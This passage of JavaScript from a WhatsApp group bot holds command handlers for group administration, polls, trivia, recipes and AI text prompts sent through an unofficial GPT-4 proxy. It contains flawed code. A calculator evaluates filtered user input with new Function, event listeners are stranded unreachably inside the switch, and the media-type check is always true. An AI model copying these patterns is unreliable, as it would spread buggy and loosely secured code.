    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");
    
    if (!text) return reply(`📝 *Usage:* ${prefix}setname New Group Name`);
    
    try {
        await devtrust.groupUpdateSubject(m.chat, text);
        reply(`✅ *Group name changed to:* ${text}`);
    } catch (e) {
        reply(`❌ *Failed:* ${e.message}`);
    }
}
break;

case 'setdesc':
case 'setgcdesc': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");
    
    if (!text) return reply(`📝 *Usage:* ${prefix}setdesc New group description`);
    
    try {
        await devtrust.groupUpdateDescription(m.chat, text);
        reply(`✅ *Group description updated*`);
    } catch (e) {
        reply(`❌ *Failed:* ${e.message}`);
    }
}
break;

case 'groupinfo':
case 'ginfo': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    
    const metadata = await devtrust.groupMetadata(m.chat);
    const participants = metadata.participants;
    const admins = participants.filter(p => p.admin);
    const bots = participants.filter(p => p.id.includes('bot') || p.id.includes('lid'));
    
    const info = `📊 *Group Information*
    
📌 *Name:* ${metadata.subject}
🆔 *ID:* ${metadata.id}
👑 *Owner:* @${metadata.owner?.split('@')[0] || 'Unknown'}
📅 *Created:* ${new Date(metadata.creation * 1000).toLocaleDateString()}
👥 *Members:* ${participants.length}
👮 *Admins:* ${admins.length}
🤖 *Bots:* ${bots.length}
🔒 *Restrict:* ${metadata.restrict ? 'Yes' : 'No'}
🔐 *Announce:* ${metadata.announce ? 'Yes' : 'No'}`;

    reply(info, metadata.owner ? [metadata.owner] : []);
}
break;

case 'setprefix': {
    if (!isCreator && !isSudo) return reply("🔒 *Owner/Sudo only*");
    
    if (!args[0]) {
        return reply(`🔧 *Current prefix:* \`${getUserPrefix(m.sender)}\`\n\nUsage: ${prefix}setprefix [new prefix]\nExample: ${prefix}setprefix !`);
    }
    
    const newPrefix = args.join(' ');
    
    if (newPrefix.length > 5) {
        return reply("❌ *Prefix too long* (max 5 characters)");
    }
    
    // Save the new prefix for THIS USER ONLY
    setUserPrefix(m.sender, newPrefix);
    
    // Update the prefix variable for current session
    prefix = newPrefix;
    
    reply(`✅ *Your prefix changed to* \`${newPrefix}\`\n_Use ${newPrefix}menu to see commands_\n_If you forget, type just "." to see your prefix_`);
}
break;

case 'gcsettings':
case 'groupsettings': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");
    
    const metadata = await devtrust.groupMetadata(m.chat);
    
    const settings = `⚙️ *Group Settings*
    
🔇 *Announce:* ${metadata.announce ? 'ON (Admins only)' : 'OFF (Everyone)'}
🔒 *Restrict:* ${metadata.restrict ? 'ON (Admins only)' : 'OFF (Everyone)'}
👥 *Approve Mode:* ${metadata.approve ? 'ON' : 'OFF'}
📝 *Ephemeral:* ${metadata.ephemeralDuration ? metadata.ephemeralDuration + ' seconds' : 'OFF'}`;

    reply(settings);
}
break;

case 'setgrouppp':
case 'setgcpp': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");
    
    const quoted = m.quoted ? m.quoted : m;
    const mime = (quoted.msg || quoted).mimetype || '';
    
    if (!/image/.test(mime)) return reply("🖼️ *Reply to an image*");
    
    try {
        const media = await quoted.download();
        await devtrust.updateProfilePicture(m.chat, media);
        reply('✅ *Group picture updated*');
    } catch (e) {
        reply(`❌ *Failed:* ${e.message}`);
    }
}
break;

case 'join': {
    if (!isCreator && !isSudo) return reply("🔒 *Owner/Sudo only*");
    
    if (!text) return reply(`🔗 *Usage:* ${prefix}join https://chat.whatsapp.com/xxxxxx`);
    
    const inviteCode = text.match(/chat\.whatsapp\.com\/([a-zA-Z0-9_-]+)/);
    if (!inviteCode) return reply("❌ *Invalid group link*");
    
    try {
        await reply("🔄 *Joining group...*");
        const result = await devtrust.groupAcceptInvite(inviteCode[1]);
        reply(`✅ *Joined successfully!*\n🆔 ${result}`);
    } catch (e) {
        reply(`❌ *Failed to join:* ${e.message}`);
    }
}
break;

case 'announce':
case 'announcement': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");
    
    if (!text) return reply(`📢 *Usage:* ${prefix}announce Your message here`);
    
    const groupMetadata = await devtrust.groupMetadata(m.chat);
    const participants = groupMetadata.participants;
    
    await devtrust.sendMessage(m.chat, {
        image: { url: 'https://files.catbox.moe/smv12k.jpeg' },
        caption: `📢 *GROUP ANNOUNCEMENT*\n\n${text}\n\n- @${m.sender.split('@')[0]}`,
        mentions: participants.map(p => p.id)
    });
}
break;

case 'acceptall': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");
    
    try {
        const requests = await devtrust.groupRequestParticipantsList(m.chat);
        if (!requests || requests.length === 0) {
            return reply("📭 *No pending join requests*");
        }
        
        reply(`🔄 *Accepting ${requests.length} requests...*`);
        
        let accepted = 0;
        for (let req of requests) {
            if (req.requestMethod === 'invite') {
                await devtrust.groupRequestParticipantsUpdate(m.chat, [req.jid], 'accept');
                accepted++;
                await sleep(1000);
            }
        }
        
        reply(`✅ *Accepted ${accepted} join requests*`);
    } catch (e) {
        reply(`❌ *Error:* ${e.message}`);
    }
}
break;

case 'rejectall': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");
    
    try {
        const requests = await devtrust.groupRequestParticipantsList(m.chat);
        if (!requests || requests.length === 0) {
            return reply("📭 *No pending join requests*");
        }
        
        reply(`🔄 *Rejecting ${requests.length} requests...*`);
        
        let rejected = 0;
        for (let req of requests) {
            await devtrust.groupRequestParticipantsUpdate(m.chat, [req.jid], 'reject');
            rejected++;
            await sleep(1000);
        }
        
        reply(`❌ *Rejected ${rejected} join requests*`);
    } catch (e) {
        reply(`❌ *Error:* ${e.message}`);
    }
}
break;

case 'poll':
case 'createpoll': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");
    
    if (!text || !text.includes('|')) {
        return reply(`📊 *Create a poll*\n\n` +
                     `📝 *Usage:* ${prefix}poll Question | Option1 | Option2\n` +
                     `💡 *Example:* ${prefix}poll Best color? | Red | Blue | Green`);
    }
    
    const parts = text.split('|');
    const question = parts[0].trim();
    const options = parts.slice(1).map(opt => opt.trim());
    
    if (options.length < 2) return reply("❌ *At least 2 options required*");
    if (options.length > 5) return reply("❌ *Maximum 5 options allowed*");
    
    await devtrust.sendMessage(m.chat, {
        poll: {
            name: question,
            values: options,
            selectableCount: 1
        }
    });
}
break;



case "mathfact": {
    await devtrust.sendPresenceUpdate("composing", m.chat);
    try {
        const res = await axios.get("http://numbersapi.com/random/math?json");
        
        const caption = `🧮 *CYBER Math Fact*
        
${res.data.text}

💡 *Random number knowledge, just for you*`;
        
        await devtrust.sendMessage(m.chat, 
            addNewsletterContext({
                text: caption,
                mentions: [m.sender]
            }), 
            { quoted: m }
        );
    } catch {
        reply("❌ *Math fact unavailable* • Numbers are being shy today");
    }
}
break;

case "recipe-ingredient": {
    if (!text) return reply("🍳 *Example:* recipe-ingredient chicken");
    
    await devtrust.sendPresenceUpdate("composing", m.chat);
    
    try {
        const res = await axios.get(`https://www.themealdb.com/api/json/v1/1/filter.php?i=${encodeURIComponent(text)}`);
        if (!res.data.meals) return reply(`🍽️ *No recipes found* using "${text}"`);
        
        const meals = res.data.meals
            .slice(0, 5)
            .map((m, i) => `${i+1}. *${m.strMeal}*`)
            .join("\n");
        
        const caption = `🍳 *CYBER Recipes*
        
🔍 *Ingredient:* ${text}

${meals}

🔗 *View full recipes:* https://www.themealdb.com`;
        
        await devtrust.sendMessage(m.chat, 
            addNewsletterContext({
                text: caption,
                mentions: [m.sender]
            }), 
            { quoted: m }
        );
    } catch {
        reply("❌ *Recipe fetch failed* • Kitchen's closed, try again later");
    }
}
break;

case 'manga': {
    if (!text) return reply(`📖 *Usage:* ${command} <manga name>`);
    
    try {
        let res = await axios.get(`https://api.jikan.moe/v4/manga?q=${encodeURIComponent(text)}&limit=1`);
        let data = res.data.data[0];
        
        if (!data) return reply("🔍 *Manga not found* • Try a different title");
        
        let mangaInfo = `📚 *CYBER Manga*
        
📌 *${data.title}*
━━━━━━━━━━━━
📊 Score: ${data.score || "N/A"} ⭐
📚 Volumes: ${data.volumes || "N/A"}
📑 Chapters: ${data.chapters || "N/A"}
📖 Status: ${data.status || "N/A"}

📝 ${data.synopsis ? data.synopsis.substring(0, 300) + "..." : "No synopsis available"}

🔗 ${data.url}`;
        
        await devtrust.sendMessage(m.chat, 
            addNewsletterContext({
                image: { url: data.images.jpg.large_image_url },
                caption: mangaInfo
            }), 
            { quoted: m }
        );
    } catch (e) {
        console.error(e);
        reply("❌ *Manga fetch failed* • The manga gods are angry today");
    }
}
break;

case 'flirt': {
    const lines = [
        "Are you a magician? Because whenever I look at you, everyone else disappears.",
        "Do you have a map? I keep getting lost in your eyes.",
        "Is your name Google? Because you have everything I've been searching for.",
        "Are you made of copper and tellurium? Because you're Cu-Te.",
        "If you were a vegetable, you'd be a cute-cumber.",
        "Do you believe in love at first sight, or should I walk past again?",
        "Is your dad a baker? Because you're a cutie pie.",
        "You must be tired because you've been running through my mind all day.",
        "Are you a parking ticket? Because you've got FINE written all over you.",
        "Did it hurt when you fell from heaven?"
    ];
    reply(`💘 *Flirt:* ${lines[Math.floor(Math.random() * lines.length)]}`);
}
break;

case 'paptt': {
    if (!isCreator) return reply("🔒 *Creator only command*");
    
    global.paptt = [
        "https://telegra.ph/file/5c62d66881100db561c9f.mp4",
        "https://telegra.ph/file/a5730f376956d82f9689c.jpg",
        "https://telegra.ph/file/8fb304f891b9827fa88a5.jpg",
        "https://telegra.ph/file/0c8d173a9cb44fe54f3d3.mp4",
        "https://telegra.ph/file/b58a5b8177521565c503b.mp4"
    ];
    
    let url = global.paptt[Math.floor(Math.random() * global.paptt.length)];
    
    if (url.includes('.')) {
        await devtrust.sendMessage(m.chat, 
            addNewsletterContext({
                video: { url: url },
                caption: "🎬 *CYBER Media*"
            }), 
            { quoted: m }
        );
    } else {
        await devtrust.sendMessage(m.chat, 
            addNewsletterContext({
                image: { url: url },
                caption: "📸 *CYBER Media*"
            }), 
            { quoted: m }
        );
    }
}
break;

case "ascii": {
    if (!text) return reply("✏️ *Example:* ascii Hello World");
    
    try {
        const res = await axios.get(`https://artii.herokuapp.com/make?text=${encodeURIComponent(text)}`);
        const ascii = res.data || text;
        
        await devtrust.sendMessage(m.chat, 
            addNewsletterContext({
                text: `🎨 *CYBER ASCII*\n\n\`\`\`${ascii}\`\`\``
            }), 
            { quoted: m }
        );
    } catch (e) {
        console.error("ASCII ERROR:", e);
        reply("❌ *ASCII generation failed*");
    }
}
break;

case 'roast': {
    let target = m.mentionedJid?.[0] ? '@' + m.mentionedJid[0].split('@')[0] : text || '@' + m.sender.split('@')[0];
    
    try {
        async function openaiRoast(victim) {
            let response = await axios.post("https://chateverywhere.app/api/chat/", {
                "model": { "id": "gpt-4", "name": "GPT-4", "maxLength": 32000 },
                "messages": [{
                    "pluginId": null,
                    "content": `Roast this person in a funny but savage way (1-2 lines): ${victim}`,
                    "role": "user"
                }],
                "temperature": 0.8
            });
            return response.data;
        }
        
        let roast = await openaiRoast(target);
        reply(`🔥 *Roast for ${target}:*\n\n${roast}`);
    } catch (e) {
        console.error(e);
        reply("⚠️ *Roast failed* • The burn machine needs repairs");
    }
}
break;

case 'compliment': {
    let target = m.mentionedJid?.[0] ? '@' + m.mentionedJid[0].split('@')[0] : text || '@' + m.sender.split('@')[0];
    
    try {
        async function openaiCompliment(victim) {
            let response = await axios.post("https://chateverywhere.app/api/chat/", {
                "model": { "id": "gpt-4", "name": "GPT-4", "maxLength": 32000 },
                "messages": [{
                    "pluginId": null,
                    "content": `Give a sweet, kind compliment to this person (1-2 lines max): ${victim}`,
                    "role": "user"
                }],
                "temperature": 0.7
            });
            return response.data;
        }
        
        let compliment = await openaiCompliment(target);
        reply(`💫 *Compliment for ${target}:*\n\n${compliment}`);
    } catch (e) {
        console.error(e);
        reply("⚠️ *Compliment failed* • The kindness machine is broken");
    }
}
break;
case "advice": {
    try {
        const res = await axios.get("https://api.adviceslip.com/advice");
        const advice = res.data?.slip?.advice || "Keep going!";
        reply(`💭 *CYBER Advice*\n\n"${advice}"`);
    } catch (e) {
        console.error("ADVICE ERROR:", e);
        reply("❌ *Advice machine is sleeping* • Try again later");
    }
}
break;

case "urban": {
    if (!text) return reply("📚 *Example:* urban sus");
    
    try {
        const res = await axios.get(`https://api.urbandictionary.com/v0/define?term=${encodeURIComponent(text)}`);
        const defs = res.data?.list;
        if (!defs || !defs.length) return reply(`🔍 No definitions found for "${text}"`);
        
        const top = defs[0];
        const msg = `📖 *CYBER Urban*\n\n📌 *${top.word}*\n\n${top.definition}\n\n💬 *Example:* ${top.example}`;
        reply(msg);
    } catch (e) {
        console.error("URBAN ERROR:", e);
        reply("❌ *Dictionary is offline* • Try again later");
    }
}
break;

case 'ship': {
    if (!text) return reply(`💘 *Usage:* ${command} name1 & name2`);
    
    let names = text.split("&");
    if (names.length < 2) return reply("⚠️ Format: name1 & name2");
    
    let name1 = names[0].trim();
    let name2 = names[1].trim();
    
    let percentage = Math.floor(Math.random() * 100) + 1;
    let bar = "❤️".repeat(Math.floor(percentage / 10)) + "🤍".repeat(10 - Math.floor(percentage / 10));
    
    reply(`💞 *CYBER Ship*\n\n${name1} 💘 ${name2}\n\nCompatibility: *${percentage}%*\n${bar}`);
}
break;

case 'rewrite': {
    if (!text) return reply(`✍️ *Usage:* ${command} your text here`);
    
    try {
        async function openaiRewrite(input) {
            let response = await axios.post("https://chateverywhere.app/api/chat/", {
                "model": { "id": "gpt-4", "name": "GPT-4" },
                "messages": [{
                    "content": `Rewrite this to be clear and grammatically correct:\n"${input}"`,
                    "role": "user"
                }],
                "temperature": 0.5
            });
            return response.data;
        }
        
        let result = await openaiRewrite(text);
        reply(`✍️ *CYBER Rewrite*\n\n${result}`);
    } catch (e) {
        console.error(e);
        reply("⚠️ *Rewrite failed* • Editor is on break");
    }
}
break;

case 'rate': {
    if (!text) return reply(`📊 *Usage:* ${command} something to rate`);
    
    let percentage = Math.floor(Math.random() * 100) + 1;
    let bar = "⭐".repeat(Math.floor(percentage / 10)) + "✩".repeat(10 - Math.floor(percentage / 10));
    
    reply(`📊 *CYBER Rate*\n\n${text}\n\n*${percentage}%* ${bar}`);
}
break;

case "solve": {
    const a = Math.floor(Math.random() * 50) + 1;
    const b = Math.floor(Math.random() * 50) + 1;
    const answer = a + b;
    
    reply(`➕ *CYBER Math*\n\nSolve: ${a} + ${b}\nReply with: mathanswer ${answer}`);
}
break;

case 'story': {
    if (!text) return reply(`📖 *Usage:* ${command} a brave warrior`);
    
    try {
        async function openaiStory(topic) {
            let response = await axios.post("https://chateverywhere.app/api/chat/", {
                "model": { "id": "gpt-4", "name": "GPT-4" },
                "messages": [{
                    "content": `Write a short creative story about: ${topic}`,
                    "role": "user"
                }],
                "temperature": 0.8
            });
            return response.data;
        }
        
        let result = await openaiStory(text);
        reply(`📖 *CYBER Story*\n\n${result}`);
    } catch (e) {
        console.error(e);
        reply("⚠️ *Storyteller is sleeping* • Try again later");
    }
}
break;

case 'cartoonify': {
    if (!m.quoted || !/image/.test(m.quoted.mtype)) 
        return reply(`🖼️ *Reply to an image* with ${command}`);
    
    try {
        let media = await downloadAndSaveMediaMessage(m.quoted);
        let fileData = fs.readFileSync(media);
        
        let response = await axios.post("https://api.itsrose.life/image/cartoonify", fileData, {
            headers: { "Content-Type": "application/octet-stream" },
            responseType: "arraybuffer"
        });
        
        fs.writeFileSync("cartoon.png", response.data);
        
        await devtrust.sendMessage(m.chat, 
            addNewsletterContext({
                image: fs.readFileSync("cartoon.png"),
                caption: "🎨 *CYBER Cartoonify*"
            }), 
            { quoted: m }
        );
    } catch (e) {
        console.error(e);
        reply("⚠️ *Cartoonify failed* • Try another image");
    }
}
break;

case 'wouldyou': {
    try {
        const questions = [
            "Fly 🕊️ or be invisible 👻?",
            "Always 10 minutes late ⏰ or 20 minutes early ⌛?",
            "Live without music 🎶 or without movies 🎥?",
            "Be rich 💰 and sad 😢, or poor 💸 but happy 😁?",
            "Eat pizza 🍕 forever or rice 🍚 forever?",
            "Time travel to past ⏳ or future 🚀?",
            "Fight 1 horse-sized duck 🦆 or 100 duck-sized horses 🐴?",
            "Never use social media 📵 or never watch TV 📺?",
            "Have super strength 💪 or super intelligence 🧠?",
            "Speak in rhymes 🎤 or sing instead of talk 🎶?"
        ];
        
        const randomQ = questions[Math.floor(Math.random() * questions.length)];
        reply(`🤔 *CYBER Would You Rather*\n\nWould you rather ${randomQ}`);
    } catch (e) {
        console.error(e);
        reply("⚠️ *Question generator failed* • Try again later");
    }
}
break;

case 'truthdare': 
case 'tod': {
    if (!text) return reply(`🎲 *Usage:* ${command} truth | dare`);
    
    try {
        async function openaiTruthDare(type) {
            let response = await axios.post("https://chateverywhere.app/api/chat/", {
                "model": { "id": "gpt-4", "name": "GPT-4" },
                "messages": [{
                    "content": `Generate a fun, creative ${type} question for Truth or Dare. Keep it short and engaging.`,
                    "role": "user"
                }],
                "temperature": 0.8
            });
            return response.data;
        }
        
        let type = text.toLowerCase().includes("truth") ? "truth" : 
                  text.toLowerCase().includes("dare") ? "dare" : null;
        
        if (!type) return reply("⚠️ Choose *truth* or *dare*");
        
        let result = await openaiTruthDare(type);
        reply(`🎲 *CYBER ${type.toUpperCase()}*\n\n${result}`);
        
    } catch (e) {
        console.error(e);
        reply("❌ *Truth/Dare failed* • Game master is sleeping");
    }
}
break;

case 'github': {
    if (!text) return reply(`👨‍💻 *Usage:* ${command} username`);
    
    try {
        let res = await axios.get(`https://api.github.com/users/${encodeURIComponent(text)}`);
        let user = res.data;
        
        if (!user || !user.login) return reply("🔍 *User not found*");
        
        let profileInfo = `👨‍💻 *CYBER GitHub*\n\n` +
            `📌 *${user.name || user.login}*\n` +
            `📍 ${user.location || "Location hidden"}\n` +
            `📦 Repos: ${user.public_repos} | 👥 Followers: ${user.followers}\n` +
            `🔗 ${user.html_url}`;
        
        await devtrust.sendMessage(m.chat, 
            addNewsletterContext({
                image: { url: user.avatar_url },
                caption: profileInfo
            }), 
            { quoted: m }
        );
    } catch (e) {
        console.error(e);
        reply("⚠️ *GitHub fetch failed* • Try again later");
    }
}
break;

case 'npm': {
    if (!text) return reply(`📦 *Usage:* ${command} package-name`);
    
    try {
        let res = await axios.get(`https://registry.npmjs.org/${encodeURIComponent(text)}`);
        let data = res.data;
        
        if (!data.name) return reply("🔍 *Package not found*");
        
        let latestVersion = data['dist-tags']?.latest;
        let info = data.versions[latestVersion];
        
        let npmInfo = `📦 *CYBER NPM*\n\n` +
            `📌 *${data.name}* v${latestVersion}\n` +
            `📝 ${data.description || "No description"}\n` +
            `👤 ${info?.author?.name || "Unknown author"}\n` +
            `📦 License: ${info?.license || "Unknown"}\n` +
            `🔗 https://www.npmjs.com/package/${data.name}`;
        
        reply(npmInfo);
    } catch (e) {
        console.error(e);
        reply("⚠️ *NPM fetch failed* • Registry might be down");
    }
}
break;

case 'poem': {
    if (!text) return reply(`📝 *Usage:* ${command} love under stars`);
    
    try {
        async function openaiPoem(topic) {
            let response = await axios.post("https://chateverywhere.app/api/chat/", {
                "model": { "id": "gpt-4", "name": "GPT-4" },
                "messages": [{
                    "content": `Write a beautiful, original poem about: ${topic}`,
                    "role": "user"
                }],
                "temperature": 0.7
            });
            return response.data;
        }
        
        let result = await openaiPoem(text);
        reply(`📝 *CYBER Poem*\n\n${result}`);
    } catch (e) {
        console.error(e);
        reply("⚠️ *Poet is on strike* • Try again later");
    }
}
break;

case 'metaai': {
    if (!text) return reply(`🤖 *Usage:* ${command} your question`);
    
    try {
        let response = await axios.post("https://chateverywhere.app/api/chat/", {
            "model": { "id": "gpt-4", "name": "GPT-4" },
            "messages": [{
                "content": text,
                "role": "user"
            }],
            "temperature": 0.5
        });
        
        let result = response.data;
        reply(`🤖 *CYBER AI*\n\n${result}`);
    } catch (e) {
        console.error(e);
        reply("⚠️ *AI is thinking too hard* • Try again later");
    }
}
break;

case 'codeai': {
    if (!text) return reply(`👨‍💻 *Usage:* ${command} write a Python function`);
    
    try {
        let response = await axios.post("https://chateverywhere.app/api/chat/", {
            "model": { "id": "gpt-4", "name": "GPT-4" },
            "messages": [{
                "content": `You are a coding assistant. Provide clean, working code:\n\n${text}`,
                "role": "user"
            }],
            "temperature": 0.4
        });
        
        let result = response.data;
        reply(`👨‍💻 *CYBER Code*\n\n${result}`);
    } catch (e) {
        console.error(e);
        reply("⚠️ *Code generator crashed* • Try again later");
    }
}
break;

case 'triviaai': {
    try {
        let response = await axios.post("https://chateverywhere.app/api/chat/", {
            "model": { "id": "gpt-4", "name": "GPT-4" },
            "messages": [{
                "content": "Give me a random trivia question with 4 options A-D. Format: Question\n\nA) \nB) \nC) \nD)\n\n✅ Answer:",
                "role": "user"
            }],
            "temperature": 0.7
        });
        
        let result = response.data;
        reply(`🎲 *CYBER Trivia*\n\n${result}`);
    } catch (e) {
        console.error(e);
        reply("⚠️ *Trivia machine broke* • Try again later");
    }
}
break;

case 'storyai': {
    if (!text) return reply(`📖 *Usage:* ${command} a brave dog in space`);
    
    try {
        let response = await axios.post("https://chateverywhere.app/api/chat/", {
            "model": { "id": "gpt-4", "name": "GPT-4" },
            "messages": [{
                "content": `Write a short story about: ${text}`,
                "role": "user"
            }],
            "temperature": 0.7
        });
        
        reply(`📖 *CYBER Story*\n\n${response.data}`);
    } catch (e) {
        reply("❌ *Story generator failed* • Try again later");
    }
}
break;

case 'photoai': {
    if (!text) return reply(`🖼️ *Usage:* ${prefix + command} a cat wearing sunglasses`);
    
    try {
        let url = `https://image.pollinations.ai/prompt/${encodeURIComponent(text)}`;
        
        await devtrust.sendMessage(m.chat, 
            addNewsletterContext({
                image: { url },
                caption: `🎨 *CYBER AI Art*\n\nPrompt: ${text}`
            }), 
            { quoted: m }
        );
    } catch (e) {
        console.error(e);
        reply("❌ *AI art generator failed* • Try again later");
    }
}   
break;

case 'welcome': {
    // --- Permission & Context Checks ---
    if (!isCreator) {
        return reply(`🔒 *CYBER Welcome*\n\nThis command is restricted to the bot owner.`);
    }
    if (!m.isGroup) {
        return reply(`👥 *CYBER Welcome*\n\nThis command can only be used within groups.`);
    }

    // --- Toggle Logic (On/Off) ---
    if (args[0] === 'on') {
        setSetting(m.chat, "welcome", true);
        return reply(`✅ *CYBER Welcome*\n\nWelcome messages have been activated for this group. New members will now be greeted.`);
    } 
    else if (args[0] === 'off') {
        setSetting(m.chat, "welcome", false);
        return reply(`❌ *CYBER Welcome*\n\nWelcome messages have been deactivated for this group.`);
    } 
    else if (args[0] === 'set') {
        // --- New Feature: Set Custom Welcome Message ---
        const customMessage = args.slice(1).join(' ');
        if (!customMessage) {
            return reply(`📝 *CYBER Welcome*\n\nPlease provide a welcome message after the command.\n\nExample:\n${prefix}welcome set Welcome to the group, @user!`);
        }
        setSetting(m.chat, "welcomeMessage", customMessage);
        return reply(`✅ *CYBER Welcome*\n\nCustom welcome message has been set.`);
    }
    else {
        // --- Default: Display Help ---
        reply(`⚙️ *CYBER Welcome — Settings*\n\n` +
              `▸ *${prefix}welcome on* — Enable welcome messages\n` +
              `▸ *${prefix}welcome off* — Disable welcome messages\n` +
              `▸ *${prefix}welcome set <text>* — Set a custom welcome message (use @user to tag)\n\n` +
              `_Default message: "Welcome @user to the group!_"`);
    }
}
break;

// ============ ANTICALL EVENT HANDLER ============
devtrust.ev.on('call', async (calls) => {
    for (const call of calls) {
        try {
            if (call.status !== 'offer') continue;
            const _acCfg = loadAnticallCfg();
            if (_acCfg.mode === 'off' || !_acCfg.mode) continue;

            // Decline the call
            try { await devtrust.rejectCall(call.id, call.from); } catch (e) {}

            // Send custom/default message to caller
            const _acMsgData = loadAnticallMsg();
            const _callerJid = call.from;
            const _callType = call.isVideo ? 'video' : 'voice';
            const _acMsg = (_acMsgData.msg || `📵 Hey {user}, please don't {calltype} call me. Send a message instead!`)
                .replace('{user}', `@${_callerJid.split('@')[0]}`)
                .replace('{calltype}', _callType);
            await devtrust.sendMessage(_callerJid, { text: _acMsg });

            // Block caller if mode = block
            if (_acCfg.mode === 'block') {
                try { await devtrust.updateBlockStatus(_callerJid, 'block'); } catch (e) {}
            }
        } catch (e) { console.error('[ANTICALL]', e); }
    }
});

// =========================================================================
// Place this function outside of your case blocks, likely in a main handler
// This listens for new group participants
// =========================================================================
devtrust.ev.on('group-participants.update', async (update) => {
    const { id, participants, action } = update;

    // Only proceed if the action is 'add' (someone joined)
    if (action !== 'add') return;

    // Check if welcome messages are enabled for this group
    const welcomeEnabled = getSetting(id, "welcome"); // You need to implement this getter
    if (!welcomeEnabled) return;

    // Fetch the custom message or use default
    let customMessage = getSetting(id, "welcomeMessage"); // You need to implement this getter
    if (!customMessage) {
        customMessage = "Welcome @user to the group!"; // Default message
    }

    const groupMetadata = await devtrust.groupMetadata(id);
    const groupName = groupMetadata.subject;

    // Process each new participant
    for (let jid of participants) {
        try {
            // --- Attempt to fetch the new user's profile picture ---
            let profilePicUrl;
            try {
                profilePicUrl = await devtrust.profilePictureUrl(jid, 'image');
            } catch {
                // Fallback image if profile picture can't be fetched
                profilePicUrl = 'https://files.catbox.moe/smv12k.jpeg';
            }

            // --- Personalize the message ---
            // Replace @user with the actual mention
            let personalizedMessage = customMessage.replace('@user', `@${jid.split('@')[0]}`);
            
            // You can add more placeholders here, e.g., @group for group name
            personalizedMessage = personalizedMessage.replace('@group', groupName);

            // --- Send the welcome message with the image ---
            await devtrust.sendMessage(id, {
                image: { url: profilePicUrl },
                caption: `👋 *Welcome to ${groupName}*\n\n${personalizedMessage}`,
                mentions: [jid] // This ensures the user is tagged
            });

        } catch (error) {
            console.error(`Error sending welcome message for ${jid}:`, error);
        }
    }
});

case 'ffstalk': {
    if (!args[0]) return reply(`🎮 *Usage:* ${command} FF_ID\nExample: ${command} 8533270051`);
    
    const ffId = args[0];
    const apiUrl = `https://apis.prexzyvilla.site/stalk/ffstalk?id=${ffId}`;
    
    try {
        await devtrust.sendMessage(m?.chat, { react: { text: `🔍`, key: m?.key } });
        
        const response = await axios.get(apiUrl);
        const data = response.data;
        
        if (!data.status) return reply("❌ *Player not found* • Check the ID");
        
        const { nickname, region, open_id, img_url } = data.data;
        
        const message = `🎮 *CYBER Free Fire*\n\n` +
            `👤 *${nickname}*\n` +
            `🆔 ID: ${open_id}\n` +
            `🌏 Region: ${region}`;
        
        await devtrust.sendMessage(m?.chat, 
            addNewsletterContext({
                image: { url: img_url },
                caption: message
            }), 
            { quoted: m }
        );
        
    } catch (error) {
        console.error('FF Stalk Error:', error);
        reply("❌ *Free Fire stalk failed* • Try again later");
    }
    break;
}

case 'npmstalk': {
    if (!text) return reply(`📦 *Usage:* ${command} package-name`);
    
    await devtrust.sendMessage(m.chat, { react: { text: `📦`, key: m.key } });
    
    try {
        const res = await axios.get(`https://www.dark-yasiya-api.site/other/npmstalk?package=${encodeURIComponent(text)}`);
        const pkg = res.data?.result;
        
        if (!res.data?.status || !pkg) {
            return reply(`🔍 *Package "${text}" not found*`);
        }
        
        const info = `📦 *CYBER NPM Stats*\n\n` +
            `📌 *${pkg.name}*\n` +
            `🆚 Latest: v${pkg.versionLatest}\n` +
            `📦 Published: v${pkg.versionPublish}\n` +
            `📬 Updates: ${pkg.versionUpdate}x\n` +
            `🪐 First: ${pkg.publishTime}\n` +
            `🔥 Last: ${pkg.latestPublishTime}`;
        
        reply(info);
        
    } catch (e) {
        console.error('NPM Info Error:', e);
        reply(`❌ *NPM fetch failed* • ${e.message}`);
    }
    break;
}
case "calculator": {
    try {
        const val = text
            .replace(/[^0-9\-\/+*×÷πEe()piPI/]/g, '')
            .replace(/×/g, '*')
            .replace(/÷/g, '/')
            .replace(/π|pi/gi, 'Math.PI')
            .replace(/e/gi, 'Math.E')
            .replace(/\/+/g, '/')
            .replace(/\++/g, '+')
            .replace(/-+/g, '-');

        const format = val
            .replace(/Math\.PI/g, 'π')
            .replace(/Math\.E/g, 'e')
            .replace(/\//g, '÷')
            .replace(/\*/g, '×');

        const result = (new Function('return ' + val))();
        
        if (!result) throw new Error('Invalid calculation');
        
        reply(`🧮 *CYBER Math*\n\n${format} = ${result}`);
    } catch (e) {
        reply(`❌ *Invalid expression*\nUse: 0-9, +, -, *, /, ×, ÷, π, e, (, )`);
    }
    break;
}

case 'setsudo': case 'sudo': case 'addsudo': {
    if (!isCreator && !isSudo) 
        return reply('🔒 *Owner/Sudo only*');

    let number;
    if (quoted) {
        number = quoted.sender.split('@')[0];
    } else if (args[0]) {
        number = args[0];
    }

    if (!number || !/^\d+$/.test(number)) {
        return reply('❌ *Valid number required* • Reply or provide number');
    }

    const jid = number + '@s.whatsapp.net';
    const sudoList = loadSudoList();

    if (sudoList.includes(jid)) 
        return reply(`⚠️ @${number} *already in sudo list*`);
    
    sudoList.push(jid);
    saveSudoList(sudoList);

    reply(`✅ @${number} *added to sudo list*`);
}
break;

case 'delsudo': {
    if (!isCreator && !isSudo) 
        return reply('🔒 *Owner/Sudo only*');

    let number;
    if (quoted) {
        number = quoted.sender.split('@')[0];
    } else if (args[0]) {
        number = args[0];
    }

    if (!number || !/^\d+$/.test(number)) {
        return reply('❌ *Valid number required*');
    }

    const jid = number + '@s.whatsapp.net';
    const sudoList = loadSudoList();

    if (!sudoList.includes(jid)) 
        return reply(`⚠️ @${number} *not in sudo list*`);
    
    const updatedList = sudoList.filter((user) => user !== jid);
